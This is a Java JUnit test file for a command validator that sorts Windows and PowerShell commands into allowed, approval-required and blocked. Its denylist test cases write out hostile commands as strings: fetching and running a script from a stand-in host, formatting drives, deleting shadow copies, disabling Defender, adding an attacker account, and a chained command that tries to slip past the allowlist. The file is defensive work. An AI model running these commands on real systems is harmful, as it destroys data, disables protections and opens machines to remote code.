package com.lmp.support.exec;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

class CommandValidatorTest {

    private CommandValidator validator;

    @BeforeEach
    void setup() {
        validator = new CommandValidator(new CommandAllowlistConfig());
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "Get-Process",
        "Get-Process -Name explorer",
        "ipconfig",
        "ipconfig /all",
        "ping google.com",
        "Get-NetAdapter",
        "systeminfo",
        "whoami /all",
        "Test-NetConnection 8.8.8.8 -Port 53"
    })
    void allowlistMatchesAreLowRisk(String cmd) {
        CommandValidationResult r = validator.validate(cmd);
        assertThat(r.riskLevel()).isEqualTo(CommandRiskLevel.LOW);
        assertThat(r.requiresApproval()).isFalse();
        assertThat(r.blocked()).isFalse();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "Invoke-Expression 'rm -rf /'",
        "iex (Invoke-WebRequest http://bad.com/x.ps1)",
        "Invoke-WebRequest http://bad.com/x | iex",
        "bcdedit /set testsigning on",
        "format C:",
        "cipher /w:C:",
        "vssadmin delete shadows /all",
        "wmic /node:victim process call create cmd.exe",
        "shutdown /r /t 0",
        "Restart-Computer",
        "manage-bde -off C:",
        "Disable-BitLocker -MountPoint C:",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Net user attacker P@ss /add",
        "Remove-Item -Recurse C:\\Windows\\System32"
    })
    void denylistMatchesAreBlocked(String cmd) {
        CommandValidationResult r = validator.validate(cmd);
        assertThat(r.riskLevel()).isEqualTo(CommandRiskLevel.BLOCKED);
        assertThat(r.blocked()).isTrue();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "Stop-Service -Name Spooler",
        "Remove-Item C:\\Temp\\file.txt",
        "Dism /Online /Cleanup-Image /RestoreHealth",
        "Set-ExecutionPolicy Unrestricted"
    })
    void highRiskHintsRequireApproval(String cmd) {
        CommandValidationResult r = validator.validate(cmd);
        assertThat(r.riskLevel()).isEqualTo(CommandRiskLevel.HIGH);
        assertThat(r.requiresApproval()).isTrue();
        assertThat(r.blocked()).isFalse();
    }

    @Test
    void unknownCommandClassifiedAsMedium() {
        CommandValidationResult r = validator.validate("Get-MyCustomCmdlet -Foo bar");
        assertThat(r.riskLevel()).isEqualTo(CommandRiskLevel.MEDIUM);
        assertThat(r.requiresApproval()).isTrue();
    }

    @Test
    void emptyCommandBlocked() {
        assertThat(validator.validate("").blocked()).isTrue();
        assertThat(validator.validate("   ").blocked()).isTrue();
    }

    @Test
    void nullCommandBlocked() {
        assertThat(validator.validate(null).blocked()).isTrue();
    }

    @Test
    void denylistChecksTakePrecedenceOverAllowlist() {
        // Even when chained with an allowlisted prefix, denylist regex wins
        CommandValidationResult r = validator.validate("Get-Process; Invoke-Expression 'evil'");
        assertThat(r.blocked()).isTrue();
    }

    @Test
    void denylistPrecedenceOverHighRiskHint() {
        // Remove-Item alone = HIGH, but with -Recurse on C:\Windows → BLOCKED
        CommandValidationResult r = validator.validate("Remove-Item -Recurse C:\\Windows\\Temp\\foo");
        assertThat(r.blocked()).isTrue();
    }

    @Test
    void reasonExposedForAuditTrail() {
        CommandValidationResult r = validator.validate("bcdedit /set testsigning on");
        assertThat(r.reason()).contains("denylist");
    }
}
